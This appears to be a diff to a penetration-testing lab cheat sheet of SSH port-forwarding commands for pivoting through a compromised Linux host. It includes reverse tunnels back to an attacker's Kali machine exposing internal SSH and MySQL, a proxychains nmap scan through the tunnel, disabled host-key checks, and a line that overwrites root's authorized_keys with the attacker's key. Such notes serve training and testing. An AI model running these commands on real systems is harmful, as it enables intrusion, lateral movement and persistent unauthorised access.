@@ -1,4 +1,54 @@
+#!/usr/bin/peno
+
+
+#general
 ssh-keygen
 ssh-copy-id -i /home/kali/.ssh/id_rsa.pub kali@localhost
 ssh -i .ssh/id_rsa kali@localhost
 ssh <username>@<IPaddress> -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+
+#Command prototype for local port forwarding using SSH
+#ssh -N -L [bind_address:]port:host:hostport [username@address]
+sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
+sudo ssh -N -L 0.0.0.0:445:Win-goal-ip:445 student@victim-vm-ip
+ssh -N -L 0.0.0.0:80:127.0.0.1:80 student@192.168.174.52 -p 2222 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+
+#Remote forwarding TCP port 2221 to the compromised Linux machine on TCP port 3306
+#Command prototype for remote port forwarding using SSH
+ssh -N -R [bind_address:]port:host:hostport [username@address]
+ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
+ssh -R 5555:localhost:5555 student@192.168.166.52 -p 2222 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@10.11.0.4    #Second iteration of ssh command -Two ports
+
+
+#Command prototype for dynamic port forwarding using SSH
+#ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
+sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
+cat /etc/proxychains.conf --> add -->
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4 	127.0.0.1 8080 
+
+# Using nmap to scan a machine through a dynamic tunnel 
+sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
+
+#Generating SSH keys
+mkdir keys
+cd keys
+ssh-keygen
+cat id_rsa.pub
+
+
+#Importing the pub key to our kali server with some restrications
+from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxO27JE5uXiHqoUUb4j9o/IPHxsPg+fflPKW4N6pK0ZXSmMfLhjaHyhUr4auF+hSnF2g1hN4N2Z4DjkfZ9f95O7Ox3m0oaUgEwHtZcwTNNLJiHs2fSs7ObLR+gZ23kaJ+TYM8ZIo/ENC68Py+NhtW1c2So95ARwCa/Hkb7kZ1xNo6f6rvCqXAyk/WZcBXxYkGqOLut3c5B+++6h3spOPlDkoPs8T5/wJNcn8i12Lex/d02iOWCLGEav2V1R9xk87xVdI6h5BPySl35+ZXOrHzazbddS7MwGFz16coo+wbHbTR6P5fF9Z1Zm9O/US2LoqHxs7OxNq61BLtr4I/MDnin www-data@ajla
+
+#Secure Tunnel with our attacking maching
+ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
+
+#Generation and Adding the public key to the /root/.ssh/authorized_keys file
+ssh-keygen
+cat:~/.ssh/id_rsa.pub
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys
+
